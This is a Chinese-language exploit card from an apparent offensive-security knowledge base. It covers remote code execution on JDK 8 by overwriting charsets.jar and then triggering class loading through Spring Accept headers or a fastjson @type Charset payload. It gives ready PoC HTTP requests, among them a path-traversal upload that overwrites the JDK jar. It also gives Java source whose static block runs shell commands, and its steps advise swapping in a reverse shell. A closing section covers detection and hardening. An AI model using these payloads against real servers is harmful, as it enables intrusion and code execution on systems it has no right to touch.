---
id: web-java-classloader-charsets-jar-load-trigger-accept-multipart-cache-fastjson
title: 覆盖 charsets.jar 之后怎么让它真正被加载：Accept 头里 multipart 前缀 / LRU 缓存两条 Charset.forName 触发链，以及非 Spring 场景的 fastjson Charset setter 触发
type: scenario
domain: web
path: web/java/classloader
technique: charsets-jar-overwrite-load-trigger-accept-multipart-cache-fastjson-charset-setter
tags:
- java
- jdk8
- charsets
- classloader
- class-init
- spring
- fastjson
- trigger
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-3W2
  verified_at: '2026-11-08T18:38:38+08:00'
  notes: 已对照原文核对；本次核对未读取图片；parseMediaTypes→MimeTypeUtils.tokenize→parseMimeType 仅 multipart 前缀进 parseMimeTypeInternal、checkParamters 调 Charset.forName、cachedMimeTypes/ConcurrentLruCache.get 回调 parseMimeTypeInternal 的第二条链、需保留 sun.nio.cs.ext.ExtendedCharsets、两条 Accept（multipart/form-data;charset=IBM33722; 与 text/html;charset=IBM33722;）、IBM33722 static 块载荷、docker 镜像与 filename 穿越路径、fastjson {@type:java.nio.charset.Charset,val:IBM33722} 与 fastjson>=1.2.68 前提均与原文一致。注：cards.json 里记录的 id 多带了 -charset-setter 后缀，实际入库 id 为 web-java-classloader-charsets-jar-load-trigger-accept-multipart-cache-fastjson，仅记录不一致、卡本身完整。未验证点：未复跑 docker 靶机与 fastjson 触发请求
url: /docs/web/java/classloader/web-java-classloader-charsets-jar-load-trigger-accept-multipart-cache-fastjson/
draft: false
kb_aliases:
- charsets.jar 触发方式
- Accept multipart charset 触发
- Charset.forName 触发链
- ExtendedCharsets 必须保留
- fastjson java.nio.charset.Charset
- MiscCodec Charset.forName
---

## 一句话结论

把恶意 `charsets.jar` 覆盖到 `$JAVA_HOME/jre/lib/` 只是“落地”，真正的执行要等 JVM 第一次加载某个扩展字符集类、触发 `static` 初始化。Spring MVC 里 `Charset.forName` 有两条可达链：`Accept` 以 `multipart` 开头时走 `parseMimeTypeInternal → checkParamters → Charset.forName`；不以 `multipart` 开头时则靠 `cachedMimeTypes` 的 `ConcurrentLruCache.get` 回调同一个解析函数。非 Spring 场景（如只有 fastjson 接口）可以用 `{"@type":"java.nio.charset.Charset","val":"IBM33722"}` 让 `MiscCodec.deserialze` 直接调 `Charset.forName`，前提是 fastjson ≥ 1.2.68。

## 原理

- **为什么需要“触发”而不是重启**：JDK 8 的字符集实现分散在 `charsets.jar`，`Charset.forName(name)` 先查缓存，未命中才通过 `CharsetProvider` 定位并加载对应字符集类；类被加载并初始化时执行 `static {}` 块——这就是任意代码执行点。JVM 不会主动扫描 `jre/lib` 下新增的 jar，所以必须“覆盖原有 jar + 让某个字符集类第一次被加载”。
- **Spring 解析 Accept 的实际调用链**：`MediaType.parseMediaTypes` → `MimeTypeUtils.tokenize`（按逗号/分号切 token）→ 逐个 `parseMediaType` → `MimeTypeUtils.parseMimeType`。而 `parseMimeType` 里只有以 `multipart` 开头的 mimeType 才会进入 `parseMimeTypeInternal`；`parseMimeTypeInternal` 解析出的 `MimeType` 在参数非空时调 `checkParamters`，其中对 `charset` 参数调 `Charset.forName`。所以 `Accept: multipart/form-data;charset=<name>;` 是最直接的触发形态。
- **第二条链（cache）**：`parseMediaTypes` 内部维护 `cachedMimeTypes`（`ConcurrentLruCache`）。当传入的 Accept 不以 `multipart` 开头时，缓存 `get` 会调用 `MimeTypeUtils$$Lambda.apply`，该匿名类的 lambda 体就是 `parseMimeTypeInternal`——于是 `Accept: text/html;charset=<name>;` 也能到达 `Charset.forName`。这解释了为什么网上大量“用 `text/html;charset=evil` 就能触发”的说法成立，但它依赖缓存回调这一实现细节，并非 `parseMimeType` 的直通路径。
- **名字要选“还没加载过”的**：命中缓存或该类已被加载过，替换 jar 后不会再次触发。作者选 `IBM33722` 这类冷门扩展字符集，正是为了避开 JDK 启动时预加载的常见字符集（GBK、UTF-8 等在初始化阶段就可能被加载）。
- **jar 必须保留 `ExtendedCharsets`**：`lookupExtendedCharset` 依赖 `sun.nio.cs.ext.ExtendedCharsets` 枚举可用字符集，删掉它就无法定位到被替换的类。因此造 jar 时“丢其他类、留 ExtendedCharsets + 一个待替换的字符集类”是正确的最小化方式。
- **fastjson 触发的前提**：`ParserConfig` 里 `java.nio.charset.Charset` 由 `MiscCodec` 处理，`MiscCodec.deserialze` 判断 `clazz == Charset.class` 时直接 `Charset.forName(val)`。这是纯 setter/反序列化路径，不依赖 Spring 的 Accept 解析，适合 fat-jar API 服务（前提是存在 fastjson 反序列化入口且版本 ≥ 1.2.68，使 `@type` 能指定该 JDK 类型）。

## 触发条件

- 已完成任意文件写，把恶意 jar 覆盖到 `$JAVA_HOME/jre/lib/charsets.jar`（JDK 8，启动类路径包含该 jar；JDK 9+ 模块化后此路径不成立）。
- 目标字符集类在本次 JVM 生命周期内尚未被加载。
- Spring 场景：任意会解析 `Accept`/`Content-Type` 的接口（MVC 的 `@RequestMapping` 方法即刻）；fastjson 场景：存在接受 JSON 的反序列化入口且版本 ≥ 1.2.68。
- 进程对 JDK 目录可写；容器需 `--rm` 重建才可重复验证（第一次加载后就缓存了）。

## 利用步骤

1. 确认 JDK 版本与安装路径（`/usr/lib/jvm/java-1.8-openjdk/jre/lib/` 一类），确认 `charsets.jar` 存在且可写。
2. 解压原 `charsets.jar`，保留 `sun/nio/cs/ext/ExtendedCharsets.class`，把选定的扩展字符集类（如 `IBM33722`）替换为含恶意 `static {}` 的同名类，重新打包为 `charsets.jar`。
3. 用任意文件写把 jar 覆盖到 `jre/lib/charsets.jar`（上传接口改 `filename` 为 `../../usr/lib/jvm/.../jre/lib/charsets.jar` 这类穿越形式）。
4. 触发：Spring 场景发 `Accept: multipart/form-data;charset=IBM33722;` 或 `Accept: text/html;charset=IBM33722;` 访问任意路由；fastjson 场景发 `{"x":{"@type":"java.nio.charset.Charset","val":"IBM33722"}}`。
5. 验证：payload 里让命令写一个带随机后缀的标记文件（如 `/tmp/charsets_test_<random>.log`），确认文件出现即代表类初始化成功。
6. 换成真实命令（反弹 shell、读配置）再次触发；注意字符集一旦加载即被缓存，重复验证要换字符集名或重启 JVM（容器用 `--rm` 重建）。
7. 副作用评估：替换 jar 会让业务在其他字符集加载时异常，可能直接打崩应用，实战中应选最冷门字符集并准备恢复原 jar。

## PoC

```http
POST /upload HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----X

------X
Content-Disposition: form-data; name="file"; filename="../../usr/lib/jvm/java-1.8-openjdk/jre/lib/charsets.jar"
Content-Type: application/octet-stream

<恶意 charsets.jar 字节>
------X--
```

```http
GET / HTTP/1.1
Host: target
Accept: multipart/form-data;charset=IBM33722;
```

```http
GET /any-route HTTP/1.1
Host: target
Accept: text/html;charset=IBM33722;
```

```http
POST /fastjson HTTP/1.1
Host: target
Content-Type: application/json

{"x":{"@type":"java.nio.charset.Charset","val":"IBM33722"}}
```

```java
// 被替换的字符集类：类初始化即执行，用随机后缀便于确认触发
package sun.nio.cs.ext;

public class IBM33722 {
    static { fun(); }
    public IBM33722() { fun(); }
    private static java.util.HashMap<String, String> fun() {
        String random = java.util.UUID.randomUUID().toString().replace("-", "").substring(1, 9);
        String os = System.getProperty("os.name");
        String[] command = os.startsWith("Windows")
            ? new String[]{"cmd.exe", "/c", "calc"}
            : new String[]{"/bin/bash", "-c", "touch /tmp/charsets_test_" + random + ".log"};
        try { Runtime.getRuntime().exec(command); } catch (Throwable ignored) {}
        return null;
    }
}
```

## 变体与关联

- **触发点变体**：`Content-Type: multipart/form-data;charset=...`、XML 声明 `encoding=`、`new String(bytes, charsetName)`、模板/编码转换、任何直接调 `Charset.forName` 的业务代码。
- **字符集名变体**：`IBM33722`、`x-IBM33722`、`Big5`、`GB2312`、`ISO-2022-CN`；选几乎没有业务使用的冷门项命中率最高。
- **非 Spring 的其他触发器**：Jackson/其他 JSON 库中的 Charset setter、JDBC 连接参数里的 charset、模板引擎的编码配置。
- **关联**：[[web-java-classloader-charsets-jar-bootstrap-overwrite-accept-gbk-rce]]（本链的“写文件 + 覆盖”侧，本卡专注“加载触发”侧）、[[web-java-classloader-charsetprovider-spi-accept-rce]]（`jre/classes` + SPI 的等价落地）、[[web-java-deser-fastjson-file-write-to-rce]]（fastjson 侧的写文件原语与落地点选择）、[[web-java-deserialization-app-readobject-controlled-put-aspectj-file-write]]（AspectJWeaver `StoreableCachingMap` 写文件原语）。
- **边界**：JDK 9+（模块化，无 `jre/lib/charsets.jar` 启动类路径语义）、目标字符集已被加载、JDK 目录只读、容器只读根文件系统，任一条件成立本链失效。

## 检测与防御

- **检测（文件）**：`$JAVA_HOME/jre/lib/charsets.jar` 的哈希/大小/修改时间变化；JDK 安装目录被 Web 进程写入；`/tmp` 出现 `charsets_test_*.log` 一类测试标记文件。
- **检测（流量）**：`Accept`/`Content-Type` 中出现冷门字符集名（`IBM33722`、`x-IBM33722` 等）或明显非法的 charset 值；JSON 体内出现 `"@type":"java.nio.charset.Charset"`。
- **检测（进程）**：Java 进程在收到请求后派生 `sh`/`bash`/`cmd.exe` 子进程；类加载日志（`-XX:+TraceClassLoading`）中出现异常的字符集类加载时机。
- **修复**：上传/写文件做路径规范化与根目录校验，禁止越过 Web 根；上传文件由服务端生成文件名并限制后缀。
- **加固**：Web 进程降权、JDK 目录只读并做完整性校验（AIDE/OSSEC/镜像校验）；升级 JDK 9+；对 `Accept`/`Content-Type` 的 charset 做白名单；fastjson 开启 `safeMode` 或升级并禁用 `@type` 任意类。
